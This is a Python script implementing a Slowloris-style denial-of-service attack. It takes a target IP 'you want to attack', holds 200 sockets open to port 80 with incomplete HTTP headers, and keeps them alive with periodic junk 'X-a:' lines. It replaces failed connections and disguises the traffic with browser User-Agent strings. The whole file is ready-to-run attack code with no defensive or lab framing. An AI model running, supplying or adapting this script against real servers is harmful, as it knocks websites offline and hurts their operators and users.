import argparse
import socket
import random
import time
import sys

# User-Agent Alternatives
# FireFox
    # Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    # Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
# Chrome
    # Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
    # IOS
    # Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1
    # Samsung
    # Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36
    # LG
    # Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36
# Opera
    # Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00
    # Opera/9.60 (Windows NT 6.0; U; en) Presto/2.1.1
# Safari
    # Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1

parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, help="Choose the IP you want to attack", required=True)
args = parser.parse_args()

class denialOfService():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
            "Accept-Language: en-us,en;q=0.5"
        ]
        # We created a list with hundreds of sockets (200 Default)
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    # Creation of the socket that will make a GET request and send the header in order to establish the initial communication.
    def newSocket(self):
        try:
            socketUnit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socketUnit.settimeout(4)
            socketUnit.connect((self._ip, self._port))
            socketUnit.send("Get /?{} HTTP/1.1\r\n".format(str(random.randint(0, 2000))).encode("utf-8"))
            for header in self._headers:
                socketUnit.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return socketUnit
        except socket.error as socketError:
            print("Error! - "+str(socketError))
            time.sleep(0.5)
            return self.newSocket()

    # Keep access on each of the sockets with requests with the X-a field.
    # x-a: ...// Doesn´t mean anything to the server so it keeps waiting for the rest of the header to arrive.
    def execute(self, timeout=sys.maxsize, sleep=15):
        timer, counter = time.time(), 0
        while(time.time() - timer < timeout):
            for socketUnit in self._sockets:
                try:
                    # Request "HTTP/1.1\r\n" The response contains header and body, the connection will not close after the response.
                    # Request "HTTP/1.1\r\n\r\n" The response contains header and body, the connection will close after the response.
                    print("Request on IP {} - Socket number: {}".format(args.ip, str(counter)))
                   
                    socketUnit.send("X-a: {} HTTP/1.1\r\n".format(str(random.randint(0, 2000))).encode("utf-8"))
                    counter += 1
                except socket.error:
                    # Replaces all sockets that fail to communicate
                    print("Socket Removed")
                    self._sockets.remove(socketUnit)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


if __name__ == "__main__":
    dos = denialOfService(args.ip)
    dos.execute(timeout= 1000)